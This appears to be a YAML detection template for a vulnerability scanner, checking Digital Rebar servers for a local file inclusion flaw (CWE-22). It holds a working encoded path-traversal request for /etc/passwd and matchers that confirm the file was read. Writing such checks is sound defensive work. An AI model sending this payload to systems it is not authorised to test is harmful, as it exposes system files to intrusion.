id: "digitalrebar-traversal"
name: "Digital Rebar - Local File Inclusion"
severity: "high"
description: "Digital Rebar versions 4.3.0, 4.3.2, 4.3.3, 4.4.0, and maybe others are vulnerable to local file inclusion because web requests can navigate outside of DRP controlled areas."
tech:
  - "generic"
tags:
  - "lfi"
  - "rackn"
  - "digitalrebar"
  - "vuln"
cwe: "CWE-22"
reference: "https://docs.rackn.io/en/latest/doc/security/cve_20200924A.html"
spaExclusion: true
request:
  method: "GET"
  path: "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
control:
  method: "GET"
  path: "/.guardian-none-{{rand}}"
matchers-condition: "and"
matchers:
  - type: "regex"
    part: "body"
    regex:
      - "root:.*:0:0"
  - type: "word"
    part: "header"
    words:
      - "X-Drp-Sha256sum:"
  - type: "status"
    status:
      - 200
